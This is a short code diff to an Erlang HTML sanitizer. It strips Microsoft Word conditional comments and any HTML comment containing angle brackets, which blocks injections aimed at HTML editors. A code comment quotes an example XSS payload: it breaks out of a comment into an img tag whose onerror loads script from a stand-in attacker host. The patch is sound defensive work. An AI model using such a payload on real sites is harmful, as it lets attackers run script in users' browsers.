@@ -159,12 +159,9 @@ sanitize_element_opts({<<"a">>, Attrs, Inner} = Element, _Stack, _Opts, _Context
         false ->
             Element
     end;
-sanitize_element_opts({comment, <<" [", _/binary>> = Comment} = Element, _Stack, _Opts, _Context) ->
+sanitize_element_opts({comment, <<" [", _/binary>>}, _Stack, _Opts, _Context) ->
     % Conditionals by Microsoft Word: <!-- [if (..)] (..) [endif]-->
-    case binary:last(Comment) of
-        $] -> <<>>;
-        _ -> Element
-    end;
+    <<>>;
 sanitize_element_opts({comment, <<"[", _/binary>>}, _Stack, _Opts, _Context) ->
     % Conditional comment, as used for Outlook <!--[if mso]>..<![endif]-->
     <<>>;
@@ -203,6 +200,13 @@ sanitize_element_opts({comment, <<" z-media ", ZMedia/binary>>}, _Stack, _Opts, 
                 zmedia => ZMedia
             }),
             <<" ">>
+    end;
+sanitize_element_opts({comment, Comment} = E, _Stack, _Opts, _Context) ->
+    % Remove comments that might contain injections for e.g. html editors.
+    % For example: <!--data-mce-selected="x"->"><img src onerror=import('//attacker.com')>-->
+    case binary:match(Comment, [ <<"<">>, <<">">> ]) of
+        nomatch -> E;
+        _ -> <<>>
     end;
 sanitize_element_opts({Tag, Attrs, Inner}, _Stack, _Opts, _Context) ->
     Attrs1 = cleanup_element_attrs(Attrs),
